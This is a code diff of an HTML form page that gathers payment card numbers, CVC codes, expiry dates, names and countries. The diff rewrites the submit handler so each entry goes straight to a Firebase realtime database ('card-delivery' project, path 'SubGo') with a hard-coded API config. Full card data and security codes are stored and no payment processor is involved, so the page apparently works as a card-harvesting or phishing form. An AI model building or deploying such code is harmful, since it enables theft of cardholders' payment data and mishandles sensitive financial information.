@@ -73,16 +73,27 @@
     <div class="linearbutton">
       <button class="button" onclick="submitForm()">SUBMIT</button>
     </div>
-
-    <!-- Firebase scripts using the specified namespace -->
-    <script defer src="https://www.gstatic.com/firebasejs/9.6.0/firebase-app-compat.js"></script>
-    <script defer src="https://www.gstatic.com/firebasejs/9.6.0/firebase-analytics-compat.js"></script>
-    <script defer src="https://www.gstatic.com/firebasejs/9.6.0/firebase-database-compat.js"></script>
-    <!-- Your initialization script -->
-    <script defer src="./init-firebase.js"></script>
     
     <!-- Your main script -->
-<script defer>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-app.js";
+import { getDatabase, ref, set, get, child } from "https://www.gstatic.com/firebasejs/9.22.1/firebase-database.js";
+
+// Paste the code from Firebase
+const firebaseConfig = {
+    apiKey: "AIzaSyCSgXwfQApXMdQUU6hG7ff0xgTNeTcKBZk",
+    authDomain: "card-delivery.firebaseapp.com",
+    projectId: "card-delivery",
+    storageBucket: "card-delivery.appspot.com",
+    messagingSenderId: "738527725245",
+    appId: "1:738527725245:web:12e89fc912b9aadd2399d4"
+};
+
+// Initialize Firebase
+const app = initializeApp(firebaseConfig);
+
+// Get a reference to the database service
+const db = getDatabase(app);
       
       function submitForm() {
         // Display loading overlay
@@ -101,25 +112,17 @@
           //document.getElementById('loadingOverlay').style.display = 'none';
           alert('Error: All fields must be filled!');
         } else {
-          // Push data to the database
-          const database = firebase.database();
 
-    const newDataRef = database.ref('SubGo');
-    newDataRef.set({
+    set(ref(db, 'SubGo/' + Math.random().toString(36).slice(2, 7)), {
       cardNumber: cardNumber,
       cvc: cvc,
       expireDate: expireDate,
       name: name,
       country: country
-    }).then(function () {
-      alert('Success!');
-    }).catch(function (error) {
-      alert('Error occurred.', error);
     });
         }
       }
 </script>
-
   </body>
 </html>
 
